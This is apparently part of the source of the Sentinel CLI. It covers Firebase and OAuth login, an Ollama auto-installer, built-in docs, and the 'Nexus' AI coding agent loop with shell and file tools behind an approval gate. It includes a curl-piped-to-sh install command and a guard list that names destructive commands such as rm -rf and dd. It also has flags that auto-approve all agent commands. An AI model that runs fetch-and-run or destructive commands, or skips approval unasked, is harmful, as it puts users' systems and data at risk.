  const postBody = providerId === "google.com" ? ("id_token=" + idpToken + "&providerId=google.com") : ("access_token=" + idpToken + "&providerId=github.com");
  const r = await httpReq({ url: "https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=" + encodeURIComponent(c.apiKey), method: "POST", headers: { "Content-Type": "application/json" }, body: { requestUri: "http://localhost", postBody, returnSecureToken: true, returnIdpCredential: true } });
  if (!r.json || r.json.error) throw new Error((r.json && r.json.error && r.json.error.message) || ("Firebase sign-in failed (HTTP " + r.status + ") — is the provider enabled in the console?"));
  return r.json; // { idToken, refreshToken, localId, email, displayName/fullName, federatedId }
}
async function firebaseLookup(idToken) { const c = firebaseCfg(); const r = await httpReq({ url: "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=" + encodeURIComponent(c.apiKey), method: "POST", headers: { "Content-Type": "application/json" }, body: { idToken } }); return r.json && r.json.users && r.json.users[0]; }
async function firebaseRefresh(refreshToken) { const c = firebaseCfg(); const r = await httpReq({ url: "https://securetoken.googleapis.com/v1/token?key=" + encodeURIComponent(c.apiKey), method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "grant_type=refresh_token&refresh_token=" + encodeURIComponent(refreshToken) }); return r.json; }

// ---- provider flows ----
function ghCliToken() { try { const r = require("child_process").spawnSync("gh", ["auth", "token"], { encoding: "utf8", timeout: 6000 }); if (!r.error && r.status === 0) { const t = (r.stdout || "").trim(); if (t) return t; } } catch (_) {} return null; }
async function githubDeviceFlow(clientId, log) {
  const dc = await httpReq({ url: "https://github.com/login/device/code", method: "POST", headers: { Accept: "application/json", "Content-Type": "application/x-www-form-urlencoded" }, body: "client_id=" + encodeURIComponent(clientId) + "&scope=" + encodeURIComponent("read:user user:email") });
  if (!dc.json || !dc.json.device_code) throw new Error("GitHub device-code request failed — check githubClientId (and that Device Flow is enabled on the OAuth app)");
  const { device_code, user_code, verification_uri, interval, expires_in } = dc.json;
  log("open " + cyan(verification_uri) + " and enter code " + bold(user_code));
  openBrowser(verification_uri);
  const started = Date.now(); let wait = (interval || 5) * 1000;
  while (Date.now() - started < (expires_in || 900) * 1000) {
    await new Promise((r) => setTimeout(r, wait));
    const tk = await httpReq({ url: "https://github.com/login/oauth/access_token", method: "POST", headers: { Accept: "application/json", "Content-Type": "application/x-www-form-urlencoded" }, body: "client_id=" + encodeURIComponent(clientId) + "&device_code=" + encodeURIComponent(device_code) + "&grant_type=urn:ietf:params:oauth:grant-type:device_code" });
    const j = tk.json || {};
    if (j.access_token) return j.access_token;
    if (j.error === "authorization_pending") continue;
    if (j.error === "slow_down") { wait += 5000; continue; }
    if (j.error) throw new Error("GitHub: " + (j.error_description || j.error));
  }
  throw new Error("GitHub device login timed out");
}
async function googleLoopbackFlow(clientId, clientSecret, log) {
  const http = require("http");
  return await new Promise((resolve, reject) => {
    let done = false;
    const server = http.createServer(async (req, res) => {
      try {
        const u = new URL(req.url, "http://127.0.0.1"); const code = u.searchParams.get("code"), err = u.searchParams.get("error");
        if (err) { res.end("Login failed: " + err); done = true; server.close(); return reject(new Error("Google: " + err)); }
        if (!code) { res.end("Waiting…"); return; }
        res.writeHead(200, { "Content-Type": "text/html" });
        res.end("<!doctype html><meta charset=utf-8><body style='font-family:-apple-system,sans-serif;background:#0b1220;color:#eaf0fb;display:flex;height:100vh;margin:0;align-items:center;justify-content:center'><div style='text-align:center'><h2 style='margin:0 0 8px'>Nexus — signed in</h2><p style='color:#8ca0c4'>You can close this tab and return to the terminal.</p></div>");
        const port = server.address().port; done = true; server.close();
        const tk = await httpReq({ url: "https://oauth2.googleapis.com/token", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "code=" + encodeURIComponent(code) + "&client_id=" + encodeURIComponent(clientId) + "&client_secret=" + encodeURIComponent(clientSecret) + "&redirect_uri=" + encodeURIComponent("http://127.0.0.1:" + port) + "&grant_type=authorization_code" });
        if (!tk.json || !tk.json.id_token) return reject(new Error("Google token exchange failed" + (tk.json && tk.json.error ? ": " + (tk.json.error_description || tk.json.error) : "")));
        resolve(tk.json.id_token);
      } catch (e) { reject(e); }
    });
    server.listen(0, "127.0.0.1", () => {
      const port = server.address().port, redirect = "http://127.0.0.1:" + port;
      const url = "https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id=" + encodeURIComponent(clientId) + "&redirect_uri=" + encodeURIComponent(redirect) + "&scope=" + encodeURIComponent("openid email profile") + "&access_type=offline&prompt=select_account";
      log("opening browser to sign in with Google…"); openBrowser(url);
    });
    setTimeout(() => { if (done) return; try { server.close(); } catch (_) {} reject(new Error("Google login timed out")); }, 180000);
  });
}

function nexusAuth() { return readGlobal("auth.json", null); }
function nexusLogout() { const fs = require("fs"), path = require("path"); try { fs.unlinkSync(path.join(sentinelHome(), "auth.json")); return true; } catch (_) { return false; } }
async function nexusLogin(provider, log) {
  log = log || ((s) => console.log("  " + s));
  const c = firebaseCfg();
  if (!firebaseReady(c)) { log(red("Firebase isn't configured yet.")); log("Save your web config to " + cyan(require("path").join(sentinelHome(), "firebase.json")) + " — see " + cyan("sentinel login --help")); return { ok: false, needConfig: true }; }
  provider = (provider || "").toLowerCase();
  let idpToken, providerId;
  if (provider === "github" || provider === "gh") {
    providerId = "github.com";
    let tok = ghCliToken();
    if (tok) log(green("using your GitHub CLI session"));
    else { if (!c.githubClientId) throw new Error("no gh CLI session and no githubClientId in firebase.json — run `gh auth login`, or add githubClientId"); tok = await githubDeviceFlow(c.githubClientId, log); }
    idpToken = tok;
  } else if (provider === "google" || provider === "g") {
    providerId = "google.com";
    if (!c.googleClientId || !c.googleClientSecret) throw new Error("googleClientId/googleClientSecret not set in firebase.json (see `sentinel login --help`)");
    idpToken = await googleLoopbackFlow(c.googleClientId, c.googleClientSecret, log);
  } else throw new Error("usage: login google | login github");
  log("verifying with Firebase…");
  const fb = await firebaseSignInWithIdp(providerId, idpToken);
  const user = { provider: providerId, email: fb.email || "", name: fb.displayName || fb.fullName || "", uid: fb.localId, idToken: fb.idToken, refreshToken: fb.refreshToken, ts: Date.now() };
  writeGlobal("auth.json", user);
  log(green("signed in as ") + (user.name || user.email || user.uid) + gray("  (" + providerId.replace(".com", "") + ")"));
  return { ok: true, user };
}
// Primary login: paste the code shown in the website's Settings → Nexus CLI.
// The code is the user's Firebase refresh token; we exchange it for a session,
// so there is nothing to set up — same account as the website.
async function nexusLoginCode(code, log) {
  log = log || ((s) => console.log("  " + s));
  code = (code || "").trim();
  if (!code) throw new Error("paste the code from the website — Settings → Nexus CLI");
  if (!firebaseCfg().apiKey) throw new Error("no Firebase apiKey configured");
  log("verifying your code…");
  let tok; try { tok = await firebaseRefresh(code); } catch (e) { throw new Error("could not reach Firebase (" + e.message + ")"); }
  if (!tok || !tok.id_token) throw new Error("that code didn't work — copy a fresh one from the website (Settings → Nexus CLI)");
  let info = null; try { info = await firebaseLookup(tok.id_token); } catch (_) {}
  const user = { provider: "code", email: (info && info.email) || "", name: (info && info.displayName) || "", uid: tok.user_id || (info && info.localId) || "", idToken: tok.id_token, refreshToken: tok.refresh_token || code, ts: Date.now() };
  writeGlobal("auth.json", user);
  log(green("signed in as ") + (user.name || user.email || user.uid || "your account"));
  return { ok: true, user };
}
function loginHelp() {
  banner(); h1("Nexus login");
  console.log("  The easy way — no OAuth setup, same account as the website:\n");
  console.log("  " + bold("1.") + " Sign in at the Sentinel website (Google, GitHub, or email).");
  console.log("  " + bold("2.") + " Open " + bold("Settings → Nexus CLI") + " and copy your code.");
  console.log("  " + bold("3.") + " Here, run " + cyan("sentinel login") + gray(" (it will prompt) — or ") + cyan("sentinel login <code>") + gray(" — and paste it."));
  console.log("     " + gray("In the Nexus TUI: type ") + cyan("/login <code>") + gray(". Check with ") + cyan("sentinel whoami") + gray("."));
  console.log("\n  " + gray("Advanced: ") + cyan("sentinel login google") + gray(" / ") + cyan("github") + gray(" do a direct OAuth flow — that path needs your own keys in ") + require("path").join(sentinelHome(), "firebase.json") + gray(" (googleClientId/Secret, githubClientId). Most people should use the code above instead.") + "\n");
}
function loginConfigWrite(kv) { const cur = firebaseCfg() || {}; let n = 0; for (const p of kv) { const i = p.indexOf("="); if (i > 0) { cur[p.slice(0, i)] = p.slice(i + 1); n++; } } writeGlobal("firebase.json", cur); console.log("  " + green("saved " + n + " field(s) → ") + require("path").join(sentinelHome(), "firebase.json")); }

// ---- Ollama auto-install + model pull (first-run "download everything" flow) ----
function ollamaReachable() { return new Promise((res) => { const r = require("http").get({ host: process.env.OLLAMA_HOST || "127.0.0.1", port: +(process.env.OLLAMA_PORT || 11434), path: "/api/tags", timeout: 1500 }, () => res(true)); r.on("error", () => res(false)); r.on("timeout", () => { r.destroy(); res(false); }); }); }
function streamCmd(cmdOrBin, args, log, shell) { return new Promise((resolve) => { const cp = require("child_process"); let p; try { p = shell ? cp.spawn("sh", ["-c", cmdOrBin], { stdio: ["ignore", "pipe", "pipe"] }) : cp.spawn(cmdOrBin, args, { stdio: ["ignore", "pipe", "pipe"] }); } catch (e) { log(red(e.message)); return resolve(1); } const onData = (b) => String(b).split(/\r?\n/).forEach((l) => { if (l.trim()) log(gray(l.slice(0, 200))); }); p.stdout.on("data", onData); p.stderr.on("data", onData); p.on("close", (code) => resolve(code || 0)); p.on("error", (e) => { log(red(e.message)); resolve(1); }); }); }
async function installOllama(log) { if (process.platform === "win32") { log("Windows: download the installer from " + cyan("https://ollama.com/download") + ", then re-run setup."); return false; } log("installing Ollama (official script)…"); return (await streamCmd("curl -fsSL https://ollama.com/install.sh | sh", null, log, true)) === 0; }
async function ensureOllamaServer(log) { if (await ollamaReachable()) return true; log("starting the Ollama server…"); try { require("child_process").spawn("ollama", ["serve"], { stdio: "ignore", detached: true }).unref(); } catch (_) {} for (let i = 0; i < 20; i++) { await new Promise((r) => setTimeout(r, 500)); if (await ollamaReachable()) return true; } return false; }
async function ollamaPull(model, log) { log("pulling " + bold(model) + gray(" — several GB, this can take a while…")); return (await streamCmd("ollama", ["pull", model], log, false)) === 0; }
function firstRunPending() { const st = readGlobal("state.json", null); return !st || !st.setupDone; }
async function nexusSetup(opts) {
  opts = opts || {}; const log = opts.log || ((s) => console.log("  " + s)); const model = opts.model || "qwen2.5-coder";
  log(bold("Nexus setup"));
  if (hasBin("claude")) log(green("● Claude Code detected") + gray(" — Nexus will use it headless by default, no config needed."));
  else log(gray("○ Claude Code not found — for the strongest engine: ") + cyan("npm i -g @anthropic-ai/claude-code"));
  const confirm = async (q) => opts.auto ? true : (opts.ask ? /^\s*(y|yes|)\s*$/i.test((await opts.ask(q)) || "") : true);
  if (hasBin("ollama")) {
    log(green("● Ollama detected")); await ensureOllamaServer(log);
    const tags = await ollamaTags();
    if (tags.some((t) => t === model || t.startsWith(model + ":"))) log(green("● " + model + " already installed"));
    else if (await confirm("Pull " + model + " (local, free coding model)? [Y/n]")) { await ensureOllamaServer(log); await ollamaPull(model, log); }
    else log(gray("skipped model download."));
  } else if (await confirm("Ollama isn't installed. Install it now for free local models? [Y/n]")) {
    if (await installOllama(log) && await ensureOllamaServer(log)) await ollamaPull(model, log);
  } else log(gray("skipped — run ") + cyan("sentinel nexus setup") + gray(" anytime to install Ollama + a model."));
  const st = readGlobal("state.json", {}) || {}; st.setupDone = true; st.setupTs = Date.now(); writeGlobal("state.json", st);
  log(green("setup complete."));
}

// ---------- AI coder (terminal AI coding agent, local Ollama, dependency-free) ----------
const { ollamaChat, ollamaTags, pickCoderModel } = require("./lib/ollama"); // local-model client (lib/ollama.js)
const CODER_SCHEMA = { type: "object", properties: { thought: { type: "string" }, action: { type: "string", enum: ["tool", "final"] }, tool: { type: "string" }, args: { type: "object" }, final: { type: "string" } }, required: ["thought", "action"] };
function coderShell(command, cwd) {
  return new Promise((resolve) => {
    const p = spawn(process.platform === "win32" ? "cmd.exe" : "/bin/sh", [process.platform === "win32" ? "/c" : "-c", command], { cwd });
    let out = ""; const cap = 12000;
    const add = (d) => { if (out.length < cap + 200) out += d.toString(); };
    const to = setTimeout(() => { try { p.kill("SIGKILL"); } catch (_) {} }, 120000);
    p.stdout.on("data", add); p.stderr.on("data", add);
    p.on("close", (code) => { clearTimeout(to); resolve({ code, output: out.length > cap ? out.slice(0, cap) + "\n...[truncated]" : (out || "(no output)") }); });
    p.on("error", (e) => { clearTimeout(to); resolve({ code: -1, output: "spawn error: " + e.message }); });
  });
}
// ---------- Nexus documentation (shared by `sentinel docs` and the TUI /docs browser) ----------
const NEXUS_DOCS = {
  overview: { title: "Overview", body:
    "Nexus is a terminal AI coding agent built into the Sentinel CLI. It drives one of three\nengines from a single dependency-free binary:\n  claude    — the Claude Code CLI in the cloud (strongest; needs `claude` installed + logged in)\n  ollama    — a free, private, local model on your machine (needs Ollama)\n  opencode  — the OpenCode CLI\n\nIt reads & writes files, runs commands, checkpoints every change, shows real token cost\nlive, saves tokens by delegating cheap work to a weaker/local model, and keeps secrets off\nthe cloud. Launch it with `sentinel nexus --tui`. Type / inside for the command menu." },
  quickstart: { title: "Quick start", body:
    "  sentinel init                 scaffold .nexus/ (project context Nexus reads each session)\n  sentinel nexus --tui          full-screen agent (Claude if installed, else local)\n  sentinel nexus --tui -e ollama  drive a 100% local, private, free agent\n  sentinel nexus \"add tests to server.js and run them\"   one-shot task\n\nFree local setup:\n  curl -fsSL https://ollama.com/install.sh | sh\n  ollama pull qwen2.5-coder      # or hermes3" },
  engines: { title: "Engines & models", body:
    "  /engine <name>                   switch AI: claude · gemini · codex · opencode · aider · ollama\n  /model [name]                    show/set the model\n  /models                          list cloud tiers + installed local models\n  /fallback <model>                auto-retry on a cheaper model when rate-limited\n  /cowork <strong> <weak>          strong model codes; weak (cheaper Claude tier OR\n                                   a free local model via ollama:<name>) does cheap work\n  Aliases: opus · sonnet · haiku · fable (or full names like claude-haiku-4-5-...)" },
  cost: { title: "Saving cost", body:
    "In rough order of impact:\n  /cowork opus ollama:qwen2.5-coder   free local worker does tests/builds/commit msgs\n  /lean                               minimal output (output tokens cost the most)\n  /effort low                         less thinking on mechanical work\n  /index                              local model auto-pulls only relevant files\n  /budget 5                           hard cap (also enforced mid-turn)\n  /estimate <prompt>                  rough cost before you send\n  /impact                             what you saved this session\n  /cheap                              preset: lean + low effort" },
  multiengine: { title: "Multi-engine", body:
    "  /race <prompt>       every engine answers at once; keep the best (fastest marked)\n  /ensemble <prompt>   every engine answers, then one synthesizes the single best\n  /review [engine]     a different engine critiques the last answer\n  /bench <prompt>      speed / tokens / cost table per engine (read-only)" },
  build: { title: "Build & verify", body:
    "  /plan <goal>         editable checklist (/plan run · /plan add · /plan done N)\n  /watch <cmd>         run a command; auto-fix the code and re-run until it passes\n  /test <file>         generate + run unit tests\n  /agents a ;; b ;; c  run independent tasks in parallel (each in an isolated git worktree)" },
  git: { title: "Git & checkpoints", body:
    "A git checkpoint is taken before every file-changing turn.\n  /undo /redo /rewind N   restore only the files Nexus changed (unrelated edits kept)\n  /diff /git /blame /recent  session diff · status+log · line authorship · recent files\n  /commit                    AI commit message + commit" },
  safety: { title: "Safety & privacy", body:
    "  /guard enforce|warn|off  preflight destructive shell commands (rm -rf, dd, pipe-to-shell…)\n  /secrets                 scan the repo for leaked credentials\n  /scan <host>             quick TCP port scan\n  /redact                  mask secrets before anything is sent to a cloud engine\n  /offline                 local-only lock — nothing leaves the machine" },
  context: { title: "Context", body:
    "  @file        inline a file into your message (Tab completes the path)\n  !cmd         run a shell command inline\n  #note        save a durable memory to .nexus/NEXUS.md\n  /pin <file>  keep a file in context every turn\n  /tree        project file tree\n  /index       build a keyword index for local auto-context\n  /compact /context   shrink & inspect the context window\n  \\ + Enter    continue on a new line" },
  session: { title: "Session", body:
    "  /resume      reload the last saved session (.nexus/session.json)\n  /export      write the conversation to a markdown file\n  /copy        copy the last reply to the clipboard\n  /dream       consolidate the session into NEXUS.md memory\n  /gaps        list TODO/FIXME/HACK markers (/gaps plan → checklist)\n  /status /doctor /impact   session status · health · savings receipt" },
  keys: { title: "Keyboard", body:
    "  Enter          send        \\ then Enter   newline\n  Shift+Tab      cycle mode (normal / auto-accept / plan)\n  Ctrl+O         expand tool detail\n  Ctrl+C         stop the current turn (again to quit)\n  Up / Down      input history      Tab   complete /command or @path\n  wheel · PgUp/PgDn · Home/End   scroll" },
  config: { title: "Project config (.nexus/)", body:
    "  NEXUS.md        project instructions loaded every session (given to ALL engines)\n  config.json     { engine, model }\n  mcp.json        MCP servers: { mcpServers: { name: { command, args } } }\n  hooks.json      shell hooks: UserPromptSubmit · PreToolUse · PostToolUse · Stop\n  commands/*.md   custom /commands (body = prompt, $ARGUMENTS substituted)\n  snippets.json · plan.json · index.json · session.json   (auto-managed; gitignored)" },
  env: { title: "Environment", body:
    "  SENTINEL_MODEL   default local model for the ollama engine\n  OLLAMA_HOST / OLLAMA_PORT   point at a remote Ollama (default 127.0.0.1:11434)\n  OLLAMA_TIMEOUT   local request timeout ms (default 300000)\n  NO_COLOR=1       disable colored output" },
};
const DOC_ORDER = ["overview", "quickstart", "engines", "cost", "multiengine", "build", "git", "safety", "context", "session", "keys", "config", "env"];
function docList() { return DOC_ORDER.map((k) => "  " + k.padEnd(12) + gray(NEXUS_DOCS[k].title)).join("\n"); }
function nexusDocs(topic) {
  banner();
  const key = (topic || "").toLowerCase().replace(/^\//, "");
  if (!key || key === "help") { console.log("  " + bold("Nexus documentation") + "\n\n  " + gray("sentinel docs <topic>") + "  ·  topics:\n\n" + docList() + "\n\n  " + gray("or read it all: ") + cyan("sentinel docs all") + "\n"); return; }
  if (key === "all") { for (const k of DOC_ORDER) { console.log("\n  " + bold(cyan("▌ " + NEXUS_DOCS[k].title))); console.log("  " + NEXUS_DOCS[k].body.replace(/\n/g, "\n  ") + "\n"); } return; }
  const d = NEXUS_DOCS[key] || Object.entries(NEXUS_DOCS).find(([k, v]) => k.startsWith(key) || v.title.toLowerCase().includes(key))?.[1];
  if (!d) { console.log("  " + red("no doc topic '" + key + "'") + "\n\n  topics:\n" + docList() + "\n"); return; }
  console.log("  " + bold(cyan("▌ " + d.title)) + "\n\n  " + d.body.replace(/\n/g, "\n  ") + "\n");
}
function nexusHelp() {
  banner();
  console.log("  " + bold("Nexus") + " — terminal AI coding agent (local Ollama)\n");
  console.log("  " + bold("USAGE"));
  console.log("    sentinel nexus [options] [task]     one-shot task, or interactive REPL if no task given");
  console.log("    sentinel nexus                      interactive session\n");
  console.log("  " + bold("OPTIONS"));
  console.log("    -e, --engine <name>                claude (default if installed) | ollama | opencode");
  console.log("    -m, --model <name>                 ollama model (ollama engine)");
  console.log("    -y, --yes, --skip-permissions      auto-approve all file writes and commands");
  console.log("        --tui                          full-screen UI: scrolling chat + fixed input box (claude/opencode)");
  console.log("        --print                        headless: run one task, print the result, exit");
  console.log("    -h, --help                         show this help\n");
  console.log("  " + bold("IN-SESSION COMMANDS"));
  console.log("    /help          list commands           /model [name]  show or switch model");
  console.log("    /auto          toggle auto-approve      /clear         reset the conversation");
  console.log("    /undo          revert last file change  /diff          list files changed this session");
  console.log("    /exit          quit\n");
  console.log("  " + gray("Attach a file to a task with @path  —  e.g.  fix the bug in @src/app.js") + "\n");
  console.log("  " + bold("ENV") + "   SENTINEL_MODEL (default model) · OLLAMA_HOST / OLLAMA_PORT (remote Ollama)\n");
  console.log("  " + gray("Nexus reads & writes files and runs commands in the current folder. Local models only — private.") + "\n");
}

async function aiCoder(argv) {
  const fs = require("fs"), path = require("path");
  const cwd = process.cwd();
  // ---- parse flags ----
  const arr = Array.isArray(argv) ? argv.slice() : String(argv || "").split(/\s+/).filter(Boolean);
  let autoApprove = false, printMode = false, modelOverride = "", enginePref = "", tuiFlag = false, parts = [];
  for (let i = 0; i < arr.length; i++) {
    const a = arr[i];
    if (a === "-y" || a === "--yes" || a === "--skip-permissions" || a === "--dangerously-skip-permissions") autoApprove = true;
    else if (a === "--print") { printMode = true; autoApprove = true; }
    else if (a === "--tui" || a === "--ui") tuiFlag = true;
    else if (a === "-m" || a === "--model") modelOverride = arr[++i] || "";
    else if (a === "-e" || a === "--engine") enginePref = arr[++i] || "";
    else if (a === "-h" || a === "--help") return nexusHelp();
    else parts.push(a);
  }
  let cfg = {}; try { cfg = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "config.json"), "utf8")); } catch (_) {}
  let nexusMd = ""; try { nexusMd = fs.readFileSync(path.join(cwd, ".nexus", "NEXUS.md"), "utf8"); } catch (_) {}
  const avail = {}; for (const e of ENGINE_ORDER) avail[e] = engineAvail(e);
  let engine = enginePref || cfg.engine || (avail.claude ? "claude" : "ollama");
  if (!avail[engine]) engine = "ollama";
  if (tuiFlag) {
    if (!process.stdout.isTTY) console.log("  " + gray("--tui needs an interactive terminal."));
    else return nexusTui(engine, cwd, nexusMd);
  }
  let model = null, modelList = [];
  if (engine === "ollama") { modelList = await ollamaTags(); if (!modelList.length) { if (!printMode) banner(); console.log("  " + red("No local model. Install Ollama + `ollama pull hermes3`, or use --engine claude.")); return; } model = modelOverride || cfg.model || process.env.SENTINEL_MODEL || pickCoderModel(modelList); }
  if (!printMode) {
    banner();
    const W = 56, bx = (s) => cyan("│ ") + s + " ".repeat(Math.max(0, W - 1 - s.length)) + cyan("│");
    const dir = cwd.length > W - 8 ? "…" + cwd.slice(-(W - 9)) : cwd;
    console.log("  " + cyan("╭" + "─".repeat(W) + "╮"));
    console.log("  " + bx("Nexus — AI coding agent"));
    console.log("  " + bx("engine: " + engine + (model ? "  (" + model + ")" : "  (Claude Code)")));
    console.log("  " + bx("dir:    " + dir));
    if (nexusMd) console.log("  " + bx("context: .nexus/NEXUS.md loaded"));
    console.log("  " + cyan("╰" + "─".repeat(W) + "╯"));
    console.log("  " + gray("message Nexus below · /help for commands · /exit to quit") + (autoApprove ? gray(" · auto-approve ON") : "") + "\n");
  }
  const SYS = "You are Nexus, a terminal AI coding agent working in " + cwd + " on the operator's own machine. Accomplish the task by taking ONE action per step and reading the OBSERVATION before the next. TOOLS: read_file{path}, write_file{path,content}, edit_file{path,find,replace} (replace one exact string), list_dir{path?}, run_command{command}. Reply with exactly ONE JSON object per the schema: {\"thought\",\"action\":\"tool\",\"tool\",\"args\"} or {\"thought\",\"action\":\"final\",\"final\"}. Write real, working code; prefer edit_file for small changes. Keep going until the task is fully done, then action:\"final\" with a short summary." + (nexusMd ? "\n\nPROJECT INSTRUCTIONS (.nexus/NEXUS.md):\n" + nexusMd.slice(0, 4000) : "");
  const messages = [{ role: "system", content: SYS }];
  let delegated = false;
  const changed = [];  // session change log for /undo and /diff: {path, before|null, label}
  const relp = (p) => path.relative(cwd, p) || p;
  // ---- permission gate (Glitch-style): confirm risky actions unless auto-approve ----
  async function approve(label) {
    if (autoApprove) return true;
    const ans = (await ask(cyan("  approve ") + label + gray("  [y]es / [n]o / [a]lways: "))).trim().toLowerCase();
    if (ans === "a" || ans === "always") { autoApprove = true; return true; }
    return ans === "" || ans === "y" || ans === "yes";
  }
  let task = parts.join(" ").trim();
  while (true) {
    if (!task) {
      if (printMode) return;
      const t = (await chatInput()).trim();
      if (!t) { task = ""; continue; }
      if (/^\/?(exit|quit|q)$/i.test(t)) { console.log("\n  " + gray("stay sharp.") + "\n"); return; }
      if (t === "/help") { nexusHelp(); continue; }
      if (t === "/auto") { autoApprove = !autoApprove; console.log("  " + gray("auto-approve " + (autoApprove ? "ON" : "OFF"))); continue; }
      if (t === "/clear") { messages.length = 1; console.log("  " + gray("conversation cleared")); continue; }
      if (t.startsWith("/model")) { const m = t.split(/\s+/)[1]; if (m) { model = m; console.log("  " + gray("model -> " + m)); } else console.log("  " + gray("model: " + (model || "(engine default)") + (modelList.length ? gray("  available: " + modelList.join(", ")) : ""))); continue; }
      if (t === "/undo") { const c = changed.pop(); if (!c) console.log("  " + gray("nothing to undo")); else try { if (c.isNew) { fs.unlinkSync(c.path); console.log("  " + gray("undid " + c.label + " (deleted new file)")); } else if (c.before != null) { fs.writeFileSync(c.path, c.before); console.log("  " + gray("undid " + c.label)); } else { console.log("  " + yellow("skipped undo of " + c.label + " — original contents weren't captured (file existed but was unreadable); not deleting it")); } } catch (e) { console.log("  " + red("undo failed: " + e.message)); } continue; }
      if (t === "/diff" || t === "/changed") { if (!changed.length) console.log("  " + gray("no changes this session")); else { console.log("  " + gray("changed this session:")); changed.forEach((c) => console.log("    " + relp(c.path) + (c.isNew ? gray("  (new)") : ""))); } continue; }
      if (t.startsWith("/")) { console.log("  " + gray("unknown command; try /help")); continue; }
      task = t;
    }
    // @path attaches a file's contents to the prompt (e.g. "fix the bug in @src/app.js")
    const userMsg = task.replace(/(^|\s)@(\S+)/g, (m, pre, p) => { try { const c = fs.readFileSync(path.resolve(cwd, p), "utf8"); return pre + "\n\n--- " + p + " ---\n" + c.slice(0, 12000) + "\n--- end " + p + " ---\n"; } catch (_) { return m; } });
    messages.push({ role: "user", content: userMsg }); task = "";
    console.log(cyan("  ▎ ") + bold("nexus") + gray("  " + engine) + "\n");
    if (engine !== "ollama") {
      await runEngineTask(engine, userMsg, cwd, autoApprove, delegated);
      delegated = true; console.log("");
      if (printMode) return;
      continue;
    }
    let didTool = false, nudges = 0;
    for (let step = 1; step <= 40; step++) {
      let raw; try { raw = await ollamaChat(model, messages, CODER_SCHEMA); } catch (e) { console.log("  " + red(e.message)); break; }
      let o; try { o = JSON.parse(raw); } catch (_) { messages.push({ role: "tool", content: "Reply with valid schema JSON only." }); continue; }
      messages.push({ role: "assistant", content: raw });
      if (o.thought && !printMode) console.log("  " + gray("- " + o.thought));
      if (o.action === "final") {
        if (!didTool && nudges++ < 3) { messages.push({ role: "tool", content: "You have not taken any action yet. Do the real work first." }); continue; }
        console.log("\n  " + green("done: ") + bold(o.final || "done") + "\n"); break;
      }
      const name = o.tool, a = o.args || {}; let result;
      try {
        if (name === "read_file") { const t = fs.readFileSync(path.resolve(cwd, a.path), "utf8"); result = { content: t.slice(0, 16000) }; if (!printMode) console.log("  " + cyan("read ") + a.path); }
        else if (name === "list_dir") { const d = path.resolve(cwd, a.path || "."); result = { items: fs.readdirSync(d, { withFileTypes: true }).map((e) => (e.isDirectory() ? e.name + "/" : e.name)).slice(0, 200) }; if (!printMode) console.log("  " + cyan("ls ") + (a.path || ".")); }
        else if (name === "write_file") {
          if (!(await approve("write " + a.path))) { result = { error: "denied by operator" }; console.log("  " + red("denied ") + a.path); }
          else { const fp = path.resolve(cwd, a.path); let before = null, isNew = false; try { before = fs.readFileSync(fp, "utf8"); } catch (e) { if (e.code === "ENOENT") isNew = true; } fs.mkdirSync(path.dirname(fp), { recursive: true }); fs.writeFileSync(fp, a.content == null ? "" : a.content); changed.push({ path: fp, before, isNew, label: "write " + a.path }); result = { ok: true }; console.log("  " + green("write ") + a.path + gray(" (" + String(a.content || "").split("\n").length + " lines" + (before != null ? ", was " + before.split("\n").length : "") + ")")); }
        }
        else if (name === "edit_file") {
          const fp = path.resolve(cwd, a.path); let t;
          try { t = fs.readFileSync(fp, "utf8"); } catch (_) { t = null; }
          if (t == null) { result = { error: "cannot read " + a.path }; }
          else if (!t.includes(a.find)) { result = { error: "find text not present in file" }; }
          else if (!(await approve("edit " + a.path))) { result = { error: "denied by operator" }; console.log("  " + red("denied ") + a.path); }
          else { fs.writeFileSync(fp, t.replace(a.find, a.replace == null ? "" : a.replace)); changed.push({ path: fp, before: t, label: "edit " + a.path }); result = { ok: true }; console.log("  " + green("edit ") + a.path); }
        }
        else if (name === "run_command") {
          if (!(await approve("run: " + a.command))) { result = { error: "denied by operator" }; console.log("  " + red("denied ") + a.command); }
          else { console.log("  " + mag("$ ") + a.command); const r = await coderShell(a.command, cwd); result = { code: r.code, output: r.output }; if (r.output && !printMode) console.log(r.output.split("\n").slice(0, 20).map((l) => "    " + gray(l)).join("\n")); }
        }
        else { result = { error: "unknown tool '" + name + "' (use read_file/write_file/edit_file/list_dir/run_command)" }; }
      } catch (e) { result = { error: e.message }; }
      if (["read_file", "write_file", "edit_file", "list_dir", "run_command"].includes(name)) didTool = true;
      messages.push({ role: "tool", content: JSON.stringify(result).slice(0, 16000) });
      if (step === 40) console.log("  " + red("(step limit reached)"));
    }
    if (printMode) return;
  }
}

// ==================== Nexus autonomous orchestrator (multi-level planning, overnight) ====================
const _cp = require("child_process");
// Detect an installed tool by looking for the executable on PATH (memoized).
// Old impl executed `<bin> --version` — ~85ms each for a Node-based tool like
// claude, run 13× per launch. A PATH stat is ~0.03ms and just as accurate for
// "is it installed", cutting a big chunk off TUI startup.
const _binCache = Object.create(null);
function hasBin(b) {
  if (b in _binCache) return _binCache[b];
  const fs = require("fs"), path = require("path");
  const exts = process.platform === "win32" ? (process.env.PATHEXT || ".EXE;.CMD;.BAT;.COM").split(";") : [""];
  for (const d of (process.env.PATH || "").split(path.delimiter)) {
    if (!d) continue;
    for (const e of exts) { try { fs.accessSync(path.join(d, b + e), fs.constants.X_OK); return (_binCache[b] = true); } catch (_) {} }
  }
  return (_binCache[b] = false);
}

// Delegate a whole task to an external agent binary (claude / opencode). Streams output; returns {ok, output}.
function runEngineTask(engine, prompt, cwd, autonomous, cont, onChunk, ctl, model, effort) {
  return new Promise((resolve) => {
    const m = ENGINES[engine];
    // Only this engine's own args() builds its flags — nothing crosses engines.
    // The "local" (Ollama) engine has no CLI form and is driven separately.
    if (!m || !m.args || m.kind === "local") return resolve({ ok: false, output: "engine '" + engine + "' cannot run as a CLI task" });
    const cmd = m.bin, args = m.args(prompt, { cont, autonomous, model, effort });
    let out = "";
    const p = _cp.spawn(cmd, args, { cwd, env: process.env });
    if (ctl && ctl.kids) ctl.kids.push(() => { try { p.kill("SIGINT"); } catch (_) {} setTimeout(() => { try { p.kill("SIGKILL"); } catch (_) {} }, 1200); }); // let ctrl+c kill this child
